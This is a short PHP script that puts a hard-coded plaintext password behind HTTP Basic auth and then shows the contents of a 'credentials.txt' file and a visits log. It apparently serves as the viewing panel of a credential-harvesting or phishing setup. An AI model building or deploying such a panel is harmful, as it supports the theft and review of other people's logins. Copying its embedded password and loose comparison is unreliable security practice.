<?php
$password = 'patrunjel123@';

if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_PW'] != $password) {
    header('WWW-Authenticate: Basic realm="Restricted Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authentication required';
    exit;
}

echo "<pre>";
if (file_exists('credentials.txt')) {
    echo file_get_contents('credentials.txt');
} else {
    echo "No credentials yet.";
}
echo "\n\n--- VISITS LOG ---\n";
if (file_exists('visits.log')) {
    echo file_get_contents('visits.log');
} else {
    echo "No visits logged.";
}
echo "</pre>";
?>
